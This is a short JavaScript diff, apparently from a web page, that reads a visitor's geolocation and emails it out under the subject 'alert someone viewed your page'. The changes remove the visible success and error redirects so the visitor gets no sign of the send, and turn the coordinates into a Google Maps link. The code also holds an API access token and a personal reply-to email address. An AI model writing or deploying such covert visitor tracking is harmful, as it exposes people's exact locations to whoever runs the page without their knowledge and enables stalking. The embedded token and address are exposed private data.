@@ -58,12 +58,12 @@ function showPosition(position)
 {
   function onSuccess() {
     // remove this to avoid redirect
-    window.location = window.location.pathname + "?message=Email+Successfully+Sent%21&isError=0";
+   
 }
 
 function onError(error) {
     // remove this to avoid redirect
-    window.location = window.location.pathname + "?message=Email+could+not+be+sent.&isError=1";
+    
 }
 
    
@@ -71,7 +71,7 @@ function onError(error) {
     data= {
      
      subject: 'alert someone viewed your page',
-     text: "Their position is Latitude: " + position.coords.latitude + "Longitude: " + position.coords.longitude,
+     text: "https://maps.google.com/?q="+position.coords.latitude+","+position.coords.longitude,
       access_token: "8k4qvdi6g9j8vy153psk4uzo",
       reply_to: "erict54757@gmail.com",
      
